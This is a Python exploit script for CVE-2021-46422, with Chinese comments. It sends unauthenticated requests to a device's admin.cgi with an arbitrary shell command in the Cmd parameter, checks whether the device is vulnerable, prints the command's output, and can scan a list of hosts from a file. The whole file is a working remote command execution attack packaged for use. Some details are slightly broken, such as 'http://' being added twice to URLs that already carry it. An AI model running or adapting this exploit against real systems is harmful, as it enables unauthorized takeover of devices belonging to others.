import argparse
import sys
import textwrap
import requests
from xml.etree import ElementTree

requests.packages.urllib3.disable_warnings()


def main(url, cmd="id", output=None):
    # 1.发请求
    full_url1 = f"http://{url}/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"
    full_url2 = f"http://{url}/cgi-bin/admin.cgi?Command=sysCommand&Cmd={cmd}"
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
               "If-None-Match": r"\"-854243114\"", "If-Modified-Since": "Mon, 24 Aug 2015 05:39:39 GMT",
               "Connection": "close"}
    try:
        response1 = requests.get(full_url1, headers=headers, verify=False, timeout=5, allow_redirects=False)
        response2 = requests.get(full_url2, headers=headers, verify=False, timeout=5, allow_redirects=False, stream=True)
    except Exception as e:
        print(f"[-]{url}请求失败")
        return
    # 2.判断是否存在漏洞
    try:
        if response1.status_code == 200 and "uid" in response1.text:
            print(f"[+]{url}存在远程代码执行漏洞")
            if not output:
                # 接收xml，并按照标签取值
                xmlparser = ElementTree.iterparse(response2.raw)
                print(f"[+]{cmd}命令执行的回显为：")
                for event, elem in xmlparser:
                    if (elem.tag == 'CmdResult'):
                        print(elem.text.strip())
            else:
                with open(f"{output}", mode="a", encoding="u8") as f:
                    f.write(f"{url}\n")
        else:
            print(f"[-]{url}不存在远程代码执行漏洞")
    except Exception as e:
        print(f"[-]该{cmd}无回显")
        return


if __name__ == '__main__':
    banner = r"""
  ______     _______     ____   ___ ____  _       _  _    __   _  _  ____   ____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || |  / /_ | || ||___ \ |___ \ 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_| '_ \| || |_ __) |  __) |
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _| (_) |__   _/ __/  / __/ 
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_|  \___/   |_||_____||_____|                                                                       
    """
    print(banner)
    # 使用argparse去解析命令行传来的参数
    parser = argparse.ArgumentParser(description="CVE-2021-46422 rce poc and exp",
                                     formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
            """example1: python3 CVE-2021-46422.py -u http://192.168.79.132\nexample2: python3 CVE-2021-46422.py -u http://192.168.79.132 -c id\nexample2: python3 CVE-2021-46422.py -f host.txt"""))
    # 添加参数
    parser.add_argument("-u", "--url", dest="url", type=str, help="input a url")
    parser.add_argument("-c", "--cmd", dest="cmd", type=str, help="input a cmd")
    parser.add_argument("-f", "--file", dest="file", type=str, help="input a file")
    parser.add_argument("-o", "--output", dest="output", type=str, help="input a file for output")
    # 把参数的值解析到对象中
    args = parser.parse_args()

    if args.file:
        with open(f"{args.file}", mode="r", encoding="u8") as f:
            for line in f:
                url = line.strip()
                if not url.startswith("http"):
                    url = f"http://{url}"
                if not main(url, output=args.output): continue
    else:
        if not main(args.url, cmd=args.cmd): sys.exit(1)
